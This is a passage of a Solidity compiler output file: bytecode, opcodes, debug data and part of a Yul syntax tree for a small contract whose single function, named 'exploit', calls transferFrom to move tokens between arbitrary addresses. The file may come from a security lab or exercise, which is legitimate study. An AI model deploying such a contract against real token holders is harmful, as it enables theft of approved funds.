0xa2646970667358221220339664f6a3efaef0779cb5fc61f2dee9573402dcd0b51f7d5dc6d066ae06cbc464736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052348015600e575f5ffd5b506102ab8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063bdc813c41461002d575b5f5ffd5b6100476004803603810190610042919061015e565b610049565b005b8373ffffffffffffffffffffffffffffffffffffffff166323b872dd8484846040518463ffffffff1660e01b8152600401610086939291906101e0565b6020604051808303815f875af11580156100a2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100c6919061024a565b5050505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100fa826100d1565b9050919050565b61010a816100f0565b8114610114575f5ffd5b50565b5f8135905061012581610101565b92915050565b5f819050919050565b61013d8161012b565b8114610147575f5ffd5b50565b5f8135905061015881610134565b92915050565b5f5f5f5f60808587031215610176576101756100cd565b5b5f61018387828801610117565b945050602061019487828801610117565b93505060406101a587828801610117565b92505060606101b68782880161014a565b91505092959194509250565b6101cb816100f0565b82525050565b6101da8161012b565b82525050565b5f6060820190506101f35f8301866101c2565b61020060208301856101c2565b61020d60408301846101d1565b949350505050565b5f8115159050919050565b61022981610215565b8114610233575f5ffd5b50565b5f8151905061024481610220565b92915050565b5f6020828403121561025f5761025e6100cd565b5b5f61026c84828501610236565b9150509291505056fea2646970667358221220339664f6a3efaef0779cb5fc61f2dee9573402dcd0b51f7d5dc6d066ae06cbc464736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x2AB DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBDC813C4 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x15E JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP5 DUP5 DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x86 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1E0 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA2 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xC6 SWAP2 SWAP1 PUSH2 0x24A JUMP JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xFA DUP3 PUSH2 0xD1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10A DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP2 EQ PUSH2 0x114 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x125 DUP2 PUSH2 0x101 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13D DUP2 PUSH2 0x12B JUMP JUMPDEST DUP2 EQ PUSH2 0x147 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x158 DUP2 PUSH2 0x134 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH0 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x176 JUMPI PUSH2 0x175 PUSH2 0xCD JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x183 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x194 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x1A5 DUP8 DUP3 DUP9 ADD PUSH2 0x117 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 PUSH2 0x1B6 DUP8 DUP3 DUP9 ADD PUSH2 0x14A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1DA DUP2 PUSH2 0x12B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1F3 PUSH0 DUP4 ADD DUP7 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x200 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x20D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x1D1 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x229 DUP2 PUSH2 0x215 JUMP JUMPDEST DUP2 EQ PUSH2 0x233 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x244 DUP2 PUSH2 0x220 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x25F JUMPI PUSH2 0x25E PUSH2 0xCD JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x26C DUP5 DUP3 DUP6 ADD PUSH2 0x236 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLER SWAP7 PUSH5 0xF6A3EFAEF0 PUSH24 0x9CB5FC61F2DEE9573402DCD0B51F7D5DC6D066AE06CBC464 PUSH20 0x6F6C634300081D00330000000000000000000000 ",
							"sourceMap": "116:268:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@exploit_101": {
									"entryPoint": 73,
									"id": 101,
									"parameterSlots": 4,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 279,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 566,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_uint256": {
									"entryPoint": 330,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_addresst_addresst_uint256": {
									"entryPoint": 350,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 4
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 586,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 450,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 465,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": 480,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 240,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 533,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 209,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 299,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 205,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 257,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 544,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_uint256": {
									"entryPoint": 308,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:3373:2",
										"nodeType": "YulBlock",
										"src": "0:3373:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "611:79:2",
													"nodeType": "YulBlock",
													"src": "611:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:2",
																"nodeType": "YulBlock",
																"src": "668:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:2",
																					"nodeType": "YulLiteral",
																					"src": "677:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:2",
																					"nodeType": "YulLiteral",
																					"src": "680:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:2"
																			},
																			"nativeSrc": "670:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:2"
																		},
																		"nativeSrc": "670:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:2"
																				},
																				"nativeSrc": "641:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:2"
																		},
																		"nativeSrc": "631:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:2"
																},
																"nativeSrc": "624:43:2",
																"nodeType": "YulFunctionCall",
																"src": "624:43:2"
															},
															"nativeSrc": "621:63:2",
															"nodeType": "YulIf",
															"src": "621:63:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:2",
														"nodeType": "YulTypedName",
														"src": "604:5:2",
														"type": ""
													}
												],
												"src": "568:122:2"
											},
											{
												"body": {
													"nativeSrc": "748:87:2",
													"nodeType": "YulBlock",
													"src": "748:87:2",
													"statements": [
														{
															"nativeSrc": "758:29:2",
															"nodeType": "YulAssignment",
															"src": "758:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "780:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "780:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "767:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "767:12:2"
																},
																"nativeSrc": "767:20:2",
																"nodeType": "YulFunctionCall",
																"src": "767:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "758:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "758:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "823:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "823:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "796:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "796:26:2"
																},
																"nativeSrc": "796:33:2",
																"nodeType": "YulFunctionCall",
																"src": "796:33:2"
															},
															"nativeSrc": "796:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "796:33:2"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nativeSrc": "696:139:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "726:6:2",
														"nodeType": "YulTypedName",
														"src": "726:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "734:3:2",
														"nodeType": "YulTypedName",
														"src": "734:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "742:5:2",
														"nodeType": "YulTypedName",
														"src": "742:5:2",
														"type": ""
													}
												],
												"src": "696:139:2"
											},
											{
												"body": {
													"nativeSrc": "886:32:2",
													"nodeType": "YulBlock",
													"src": "886:32:2",
													"statements": [
														{
															"nativeSrc": "896:16:2",
															"nodeType": "YulAssignment",
															"src": "896:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "907:5:2",
																"nodeType": "YulIdentifier",
																"src": "907:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "896:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "896:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "841:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "868:5:2",
														"nodeType": "YulTypedName",
														"src": "868:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "878:7:2",
														"nodeType": "YulTypedName",
														"src": "878:7:2",
														"type": ""
													}
												],
												"src": "841:77:2"
											},
											{
												"body": {
													"nativeSrc": "967:79:2",
													"nodeType": "YulBlock",
													"src": "967:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1024:16:2",
																"nodeType": "YulBlock",
																"src": "1024:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "1033:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1033:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "1036:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1036:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "1026:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "1026:6:2"
																			},
																			"nativeSrc": "1026:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1026:12:2"
																		},
																		"nativeSrc": "1026:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1026:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "990:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "990:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "1015:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "1015:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nativeSrc": "997:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "997:17:2"
																				},
																				"nativeSrc": "997:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "997:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "987:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "987:2:2"
																		},
																		"nativeSrc": "987:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "987:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "980:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "980:6:2"
																},
																"nativeSrc": "980:43:2",
																"nodeType": "YulFunctionCall",
																"src": "980:43:2"
															},
															"nativeSrc": "977:63:2",
															"nodeType": "YulIf",
															"src": "977:63:2"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nativeSrc": "924:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "960:5:2",
														"nodeType": "YulTypedName",
														"src": "960:5:2",
														"type": ""
													}
												],
												"src": "924:122:2"
											},
											{
												"body": {
													"nativeSrc": "1104:87:2",
													"nodeType": "YulBlock",
													"src": "1104:87:2",
													"statements": [
														{
															"nativeSrc": "1114:29:2",
															"nodeType": "YulAssignment",
															"src": "1114:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "1136:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1136:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "1123:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "1123:12:2"
																},
																"nativeSrc": "1123:20:2",
																"nodeType": "YulFunctionCall",
																"src": "1123:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "1114:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1114:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "1179:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "1179:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nativeSrc": "1152:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "1152:26:2"
																},
																"nativeSrc": "1152:33:2",
																"nodeType": "YulFunctionCall",
																"src": "1152:33:2"
															},
															"nativeSrc": "1152:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "1152:33:2"
														}
													]
												},
												"name": "abi_decode_t_uint256",
												"nativeSrc": "1052:139:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "1082:6:2",
														"nodeType": "YulTypedName",
														"src": "1082:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "1090:3:2",
														"nodeType": "YulTypedName",
														"src": "1090:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "1098:5:2",
														"nodeType": "YulTypedName",
														"src": "1098:5:2",
														"type": ""
													}
												],
												"src": "1052:139:2"
											},
											{
												"body": {
													"nativeSrc": "1314:648:2",
													"nodeType": "YulBlock",
													"src": "1314:648:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1361:83:2",
																"nodeType": "YulBlock",
																"src": "1361:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "1363:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "1363:77:2"
																			},
																			"nativeSrc": "1363:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1363:79:2"
																		},
																		"nativeSrc": "1363:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1363:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1335:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1335:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "1344:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1344:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "1331:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1331:3:2"
																		},
																		"nativeSrc": "1331:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1331:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1356:3:2",
																		"nodeType": "YulLiteral",
																		"src": "1356:3:2",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "1327:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1327:3:2"
																},
																"nativeSrc": "1327:33:2",
																"nodeType": "YulFunctionCall",
																"src": "1327:33:2"
															},
															"nativeSrc": "1324:120:2",
															"nodeType": "YulIf",
															"src": "1324:120:2"
														},
														{
															"nativeSrc": "1454:117:2",
															"nodeType": "YulBlock",
															"src": "1454:117:2",
															"statements": [
																{
																	"nativeSrc": "1469:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1469:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1483:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1483:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1473:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1473:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1498:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1498:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1533:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1533:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1544:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1544:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1529:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1529:3:2"
																				},
																				"nativeSrc": "1529:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1529:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1553:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1553:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1508:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1508:20:2"
																		},
																		"nativeSrc": "1508:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1508:53:2"
																	},
